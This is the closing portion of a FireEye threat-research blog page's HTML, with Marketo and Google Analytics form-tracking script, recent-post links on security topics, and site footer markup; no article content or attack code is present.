			//if(typeof marketoFormViewTealiumEvent !== "undefined" && typeof utag!=="undefined"){marketoFormViewTealiumEvent(form);}
			if(typeof marketoFormViewGtmEvent !== "undefined") {
				marketoFormViewGtmEvent(form);
			}
			form.onSubmit(function(values){
                //Check if GA fields are present
                if(($("input[name='GACLIENTID__c']").length>0)&&($("input[name='GAUSERID__c']").length>0)&&($("input[name='GATRACKID__c']").length>0)&&(typeof ga!=="undefined"))
                {
                      ga(function(){ 
                          //Get tracking ID and Client ID
                           var tracker = ga.getAll()[0];
                           var trackingId = tracker.get('trackingId');
                           var clientId = tracker.get('clientId');
                           var userId = tracker.get('userId');
                           $("input[name='GACLIENTID__c'").val(clientId);
                           $("input[name='GATRACKID__c'").val(trackingId);
                           $("input[name='GAUSERID__c'").val(userId);
                       });
                 }
            
        	});
			form.onSuccess(function(values, followUpUrl) {
				//if(typeof marketoFormSubmitTealiumEvent !== "undefined"){marketoFormSubmitTealiumEvent(values);}
				if(typeof marketoFormSubmitGTMEvent !== "undefined") {
					marketoFormSubmitGTMEvent(values);
				}
				
				if(typeof fdc.blog.replaceFormWithThankYou === "function") {
					var result = fdc.blog.replaceFormWithThankYou(form,values,followUpUrl);
					if (result === false) {
						return false;
					}
				} 
				return true;
			});
			
			var adrC = typeof addMissingUTMsFromCookies !== "undefined" ? addMissingUTMsFromCookies(document.URL) : document.URL;
			form.addHiddenFields({ ADR__c: adrC,ADR_Credit__c_account: document.title,ADR_Credit__c: document.referrer });
			if(($("input[name='GACLIENTID__c']").length==0)&&($("input[name='GAUSERID__c']").length==0)&&($("input[name='GATRACKID__c']").length==0)){
				form.addHiddenFields({ GACLIENTID__c:"",GAUSERID__c:"",GATRACKID__c:""});				
			}
			
		});
	</script>
</div></div>
<div class="section share">
<h6><small>Share</small></h6>

<div class="addthis_inline_share_toolbox_7uq8"></div>
</div>
<div class="section recent">
<h6>Recent Posts</h6>

<div class="c05 c05v0"><ul>
<li class="c05_item"><p class="c05_date">04 Mar 2021</p><a class="c05_link" href="/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html" title="Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities">Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities</a></li>

<li class="c05_item"><p class="c05_date">04 Mar 2021</p><a class="c05_link" href="/blog/threat-research/2021/03/sunshuttle-second-stage-backdoor-targeting-us-based-entity.html" title="New SUNSHUTTLE Second-Stage Backdoor Uncovered Targeting U.S.-Based Entity; Possible Connection to UNC2452">New SUNSHUTTLE Second-Stage Backdoor Uncovered Targeting U.S.-Based
Entity; Possible Connection to UNC2452</a></li>

<li class="c05_item"><p class="c05_date">03 Mar 2021</p><a class="c05_link" href="/blog/threat-research/2021/03/fuzzing-image-parsing-in-windows-uninitialized-memory.html" title="Fuzzing Image Parsing in Windows, Part Two: Uninitialized Memory">Fuzzing Image Parsing in Windows, Part Two: Uninitialized Memory</a></li>
</ul></div>
</div>
<a href="/content/fireeye-www/en_US/blog/threat-research/_jcr_content.feed" target="_blank">
<div class="section rss">
<h6><small>RSS Feed: </small><small>Stay Connected</small></h6>
<span class="ficon ficon-feed"></span>
</div>
</a>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</main>

<div class="footer_f635 footer">

<footer id="g03-footer" class="l_footer g03 g03v0 g03v2 g03-5col">
<div class="main-footer-wrapper">

<div class="g03_list g03_list_1">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Company</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company.html" class="Footer">Why FireEye?</a></li>
<li class="g03_item"><a href="/customers.html" class="Footer">Customer Stories</a></li>
<li class="g03_item"><a href="/company/jobs.html" class="Footer">Careers</a></li>
<li class="g03_item"><a href="/company/compliance-certification.html" class="Footer">Certifications and Compliance</a></li>
<li class="g03_item"><a href="http://investors.fireeye.com/" target="_blank" class="Footer">Investor Relations</a></li>
<li class="g03_item"><a href="/company/supplier.html" class="Footer">Supplier Documents</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_2">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>News and Events</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company/newsroom.html" class="Footer">Newsroom</a></li>
<li class="g03_item"><a href="/company/press-releases.html" class="Footer">Press Releases</a></li>
<li class="g03_item"><a href="/company/webinars.html" class="Footer">Webinars</a></li>
<li class="g03_item"><a href="/company/events.html" class="Footer">Events</a></li>
<li class="g03_item"><a href="/company/awards.html" class="Footer">Awards and Honors</a></li>
<li class="g03_item"><a href="/company/contact-us/manage-your-communication-preference.html" class="Footer">Email Preferences</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_3">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Technical Support</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company/incident-response.html" class="Footer">Incident?</a></li>
<li class="g03_item"><a href="/company/security.html" class="Footer">Report Security Issue</a></li>
<li class="g03_item"><a href="/support/contacts.html" class="Footer">Contact Support</a></li>
<li class="g03_item"><a href="https://csportal.fireeye.com/secur/login_portal.jsp?orgId=00D3000000063LS&portalId=06030000000pSNE" target="_blank" class="Footer">Customer Portal</a></li>
<li class="g03_item"><a href="https://community.fireeye.com/s/support-community" target="_blank" class="Footer">Communities</a></li>
<li class="g03_item"><a href="https://docs.fireeye.com" target="_blank" class="Footer">Documentation Portal</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_4">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>FireEye Blogs</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/blog/threat-research.html" class="Footer">Threat Research</a></li>
<li class="g03_item"><a href="/blog/products-and-services.html" class="Footer">FireEye Stories</a></li>
<li class="g03_item"><a href="/blog/executive-perspective.html" class="Footer">Industry Perspectives</a></li>
</ul></div>
<div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Threat Map</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/cyber-map/threat-map.html" class="Footer">View the Latest Threats</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_5">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Contact Us</strong><br>
<div class="footer-list section">
<ul class="g03_block">
<li class="g03_item"><a href="tel:+1 877-347-3393" class="contactlinks">+1 877-347-3393</a><br>&nbsp;</li>
</ul>
</div></div>
<div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Stay Connected</strong></p></div>
<div class="followus-footer section"><h4 class="g03_title" id="g03-followus-title"> </h4><ul class="g03_block g03-s" id="g03-followus-list"><li class="g03_item g03_item-s">
<a href="https://www.linkedin.com/company/fireeye" target="_blank">
<span class="g03-s-i ficon g03-s-i-li ficon-linkedin"></span>
<span class="g03-s_label">LinkedIn</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://twitter.com/fireeye" target="_blank">
<span class="g03-s-i ficon g03-s-i-tw ficon-twitter2"></span>
<span class="g03-s_label">Twitter</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://www.facebook.com/FireEye" target="_blank">
<span class="g03-s-i ficon g03-s-i-fb ficon-facebook2"></span>
<span class="g03-s_label">Facebook</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://www.youtube.com/user/FireEyeInc" target="_blank">
<span class="g03-s-i ficon g03-s-i-yt ficon-youtube2"></span>
<span class="g03-s_label">YouTube</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://itunes.apple.com/us/podcast/eye-on-security/id1073779629?mt=2" target="_blank">
<span class="g03-s-i ficon g03-s-i-pc ficon-podcast"></span>
<span class="g03-s_label">Podcast</span>
</a>
</li></ul>
</div>
<div class="htmlpassthru section">
<div class="country-notification">
<div id="c08_modal-lang" class="c08_modal lang">
<div class="c08 c08v1">
<div class="c08_header">
<a href="#dismiss-lightbox" class="ficon ficon-close c08_dismiss" data-behavior="dismiss-c08"></a>
</div>
<div class="c08_content">
<div class="c08_body">
<div class="col FR">
<p class="type-ML">Cette page est également disponible en français.</p>
<div class="button section"><a class="btn" href="/index.html">Version française</a></div>
</div>
<div class="col DE">
<p class="type-ML">Diese Seite ist auch auf Deutsch verfügbar</p>
<div class="button section"><a class="btn" href="/index.html">Zur deutschen Seite wechseln</a></div>
</div>
<div class="col JP">
<p class="type-ML">日本語ページを</p>
<div class="button section"><a class="btn" href="/index.html">見る</a></div>
</div>
<div class="col KR">
<p class="type-ML">해당 페이지는 한글 버전으로 보실 수 있습니다</p>
<div class="button section"><a class="btn" href="/index.html">바로 가기</a></div>
</div>
<hr>
<div class="col">
<p><a class="dismiss" href="#dismiss-lightbox" data-behavior="dismiss-c08">Continue viewing this page in English</a></p>
</div>
</div>
</div>
</div>
</div>
<style>
.c08_modal.lang {
    background: rgba(255,255,255,0.8);
}
.c08_modal.lang .c08_header {
    background: transparent;
    border-left: none;
}
.c08_modal.lang .c08 {
    top: 20%;
    width: 600px;
    border-radius: 12px;
    box-shadow: rgba(0, 0, 0, 0.37) 0 0 15px;
    border: 1px solid #b4b5b8;
    background-image: url("/content/dam/fireeye-www/fw/images/bg-language-select.jpg");
    background-position: right bottom;
    margin: 0 auto;
    position: relative;
    max-width: 90%;
}
.c08_modal.lang .c08_dismiss {
    color: #222;
}
.c08_modal.lang .c08_body {
    padding: 12px 50px 60px;
}
.c08_modal.lang .col {
    display: none;
}
.c08_modal.lang .col:last-child {
    display: block;
}
.c08_modal.lang .btn {
    margin-bottom: 0;
}
.c08_modal.lang hr {
    margin: 30px 80px;
}
.c08_modal.lang hr:before {
    border-bottom: none;
}
</style>
</div></div>
</div>
</div></div>
<div class="legal-footer-wrapper">
<div class="legal-footer">
<div class="g03_copyright">
<p class="g03_copyright_p">
Copyright&nbsp;&copy;&nbsp;2021&nbsp;FireEye, Inc.&nbsp;All rights reserved.&nbsp;<span class="g03-legal"><a href="/company/privacy.html">Privacy &amp; Cookies Policy</a> | <a href="/company/privacy-shield-commitment.html">Privacy Shield</a> | <a href="/company/legal.html">Legal Documentation</a></span>
</p>
</div><div class="g03_languages">
<a class="g01_options-option" href="#footer-worldwide">
<span>Site Language</span>
<span>English<span class="ficon ficon-globe"></span></span>
</a>
<div class="option-menu" id="footer-worldwide">
<p><strong>My preferred language:</strong></p>
<ul class="g01_options_list"><li><a href="https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html" target="_blank">English (English)</a></li>
<li><a href="https://www.fireeye.fr" target="_blank">French (Français)</a></li>
<li><a href="https://www.fireeye.de" target="_blank">German (Deutsch)</a></li>
<li><a href="https://www.fireeye.jp" target="_blank">Japanese (日本語)</a></li>
<li><a href="https://www.fireeye.kr" target="_blank">Korean (한국어)</a></li>
<li><a href="/products/international-literature.html">More languages</a></li>
</ul>
</div>
</div> </div>
</div>
</footer>
</div>
<script type="text/javascript" src="/etc/designs/fireeye-www/clientlibs_fw.min.js"></script>


<div class="htmlpassthru_c66c htmlpassthru">
</div>

<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=fewebadmin"></script>
</body>
</html>
